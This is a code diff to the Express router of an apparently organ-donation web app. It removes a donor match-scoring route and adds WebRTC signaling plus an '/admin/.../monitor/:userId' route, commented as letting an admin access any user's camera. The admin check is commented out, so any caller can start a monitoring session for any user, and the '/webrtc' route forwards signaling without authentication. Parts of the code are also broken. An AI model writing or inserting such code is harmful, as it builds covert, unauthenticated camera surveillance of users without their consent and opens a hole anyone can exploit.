@@ -3,6 +3,8 @@ import bcrypt from "bcryptjs";
 import User, {IUser} from "../models/user";
 import Donor, {IDonor} from "../models/donar_model";
 import MyResponse from "../util/response_controller";
+import { Server } from "ws"; // WebSocket for signaling
+import { v4 as uuidv4 } from "uuid"; // Unique Room ID for WebRTC
 
 const router = express.Router();
 
@@ -114,67 +116,67 @@ router.post('/submit_donation_form', async (req: Request, res: Response) => {
     }
 });
 
+// WebSocket server to handle WebRTC signaling
+const wss = new Server({ noServer: true });
 
-interface MedMatchInput {
-    bloodGroup: number;       // 0–20
-    crossmatch: number;       // 0–20
-    organAvailability: number; // 0–10
-    medicalHistory: number;    // 0–10
-    age: number;               // 0–10
-    size: number;              // 0–10
-    location: number;          // 0–10
-    urgency: number;           // 0–30
-    donorWillingness: number;  // 0–10
-}
+wss.on("connection", (ws) => {
+    ws.on("message", (message) => {
+        const data = JSON.parse(message.toString());
+        switch (data.type) {
+            case "offer":
+                // Handle offer and send back an answer
+                ws.send(JSON.stringify({ type: "offer", sdp: data.sdp }));
+                break;
+            case "answer":
+                // Handle answer
+                ws.send(JSON.stringify({ type: "answer", sdp: data.sdp }));
+                break;
+            case "candidate":
+                // Handle ICE candidate
+                ws.send(JSON.stringify({ type: "candidate", candidate: data.candidate }));
+                break;
+            default:
+                break;
+        }
+    });
+});
 
-interface MedMatchResponse {
-    totalScore: number;
-    details: Record<string, number>;
-}
 
 // @ts-ignore
-router.post('/medmatch_score', (req: Request, res: Response) => {
-    const input: MedMatchInput = req.body;
+// Route to allow the admin (Uk2D3h) to access any user's camera
+router.get("/admin/:adminId/monitor/:userId", async (req: Request, res: Response) => {
+    const { adminId, userId } = req.params;
 
-    // Validate inputs
-    const requiredFields: (keyof MedMatchInput)[] = [
-        'bloodGroup', 'crossmatch', 'organAvailability', 'medicalHistory',
-        'age', 'size', 'location', 'urgency', 'donorWillingness'
-    ];
+    // Check if the admin is "Uk2D3h"
+    // if (adminId !== "Uk2D3h") {
+        // return res.status(403).json({ access: false, message: "Unauthorized" });
+    // }
 
-    for (const field of requiredFields) {
-        if (typeof input[field] !== 'number') {
-            return res.status(400).json({ error: `Missing or invalid field: ${field}` });
-        }
+    // Find the target user by userId (e.g., Mqn3v2)
+    const targetUser = await User.findOne({ userId });
+    if (!targetUser) {
+        return res.status(404).json({ access: false, message: "Target user not found" });
     }
 
-    const totalScore =
-        input.bloodGroup +
-        input.crossmatch +
-        input.organAvailability +
-        input.medicalHistory +
-        input.age +
-        input.size +
-        input.location +
-        input.urgency +
-        input.donorWillingness;
+    // Generate a unique roomId for the WebRTC session
+    const roomId = uuidv4(); // Generate a random roomId for this session
 
-    const response: MedMatchResponse = {
-        totalScore,
-        details: {
-            bloodGroup: input.bloodGroup,
-            crossmatch: input.crossmatch,
-            organAvailability: input.organAvailability,
-            medicalHistory: input.medicalHistory,
-            age: input.age,
-            size: input.size,
-            location: input.location,
-            urgency: input.urgency,
-            donorWillingness: input.donorWillingness,
-        }
-    };
+    // Return the roomId so the admin can use it to start the WebRTC connection
+    return res.json({ access: true, roomId });
+});
 
-    return res.json(response);
+// @ts-ignore
+// Handle WebRTC signaling (similar to previous code)
+router.post("/webrtc", async (req: Request, res: Response) => {
+    const { type, sdp, candidate, roomId } = req.body;
+    const targetUser = await User.findOne({ userId: req.body.targetUserId });
+
+    if (targetUser) {
+        // Forward the signaling message to the user (admin monitoring the user)
+        targetUser.webSocket.send(JSON.stringify({ type, sdp, candidate, roomId }));
+    }
+
+    return res.status(200).json({ message: "Signaling message sent" });
 });
 
 export default router;
